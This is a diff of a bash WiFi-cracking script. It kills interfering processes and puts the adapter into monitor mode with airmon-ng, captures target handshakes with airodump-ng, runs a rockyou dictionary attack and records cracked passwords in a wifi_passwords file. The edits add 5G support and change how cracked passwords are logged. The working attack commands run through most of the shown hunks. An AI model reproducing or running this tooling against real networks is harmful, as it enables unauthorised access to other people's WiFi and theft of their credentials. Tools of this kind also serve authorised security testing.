@@ -1,6 +1,8 @@
 #!/bin/bash
 
 # version: 2.0 28/12/24 04:48
+# 	- Include 5G, correct writing to the wifi_passwords file | 5:27
+#	- 
 
 
 ### To Do ###
@@ -17,7 +19,7 @@
 
 
 # **IMPORTANT** for Alfa AWUS036AXML wifi card don't run apt upgrade. or else the card won't work.
-# To enable 6Ghz run: sudo iw reg set US 
+# To enable 6Ghz run: "sudo iw reg set US" and reboot.
 
 # Start the script while connected to internet in order to download rockyou wordlist if not exist in it's path
 # ------------------------------
@@ -94,8 +96,7 @@ function adapter_config() {
 	    echo "WiFi adapter: $wifi_adapter already in monitor mode. proceeding.."
 	else
 	    read -p "WiFi adapter not detected. Please enter the name of your WiFi adapter: " wifi_adapter
-	fi  
-	
+	fi  	
 	sudo airmon-ng check kill    # kill proccesses that interfere with airmon-ng
 	echo -e "WiFi adapter: $wifi_adapter\nStarting $wifi_adapter in monitor mode"
 	sudo airmon-ng start "$wifi_adapter"
@@ -216,8 +217,8 @@ function network_scanner() {
 
         mkdir $targets_path/"$bssid_name"
 
-        echo "Validating network:"
-        gnome-terminal --geometry=93x15-10000-10000 -- script -c "sudo airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter"mon"" "$targets_path/$bssid_name/airodump_output.txt"
+        echo -e "\e[1mValidating network:\e[0m"
+        gnome-terminal --geometry=105x15-10000-10000 -- script -c "sudo airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter"mon"" "$targets_path/$bssid_name/airodump_output.txt"
         #sleep 10
 
 	found=0
@@ -338,7 +339,8 @@ function dictionary_attack() {
 	if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
 	    wifi_pass=$(cat "$targets_path/$bssid_name/$bssid_name-wifi_password.txt")
 	    echo -e "The wifi password of \033[1;31m\033[1m$bssid_name\033[0m is:	\033[1;31m\033[1m$wifi_pass\033[0m"
-	    echo "The wifi password is:   $wifi_pass" >> $targets_path/wifi_passwords.txt
+	    #echo "The wifi password is:   $wifi_pass" >> $targets_path/wifi_passwords.txt
+	    sed -i "/We got handshake for ($bssid_address): $bssid_name/a The wifi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
 	    cleanup
 	    exit 1
 	else
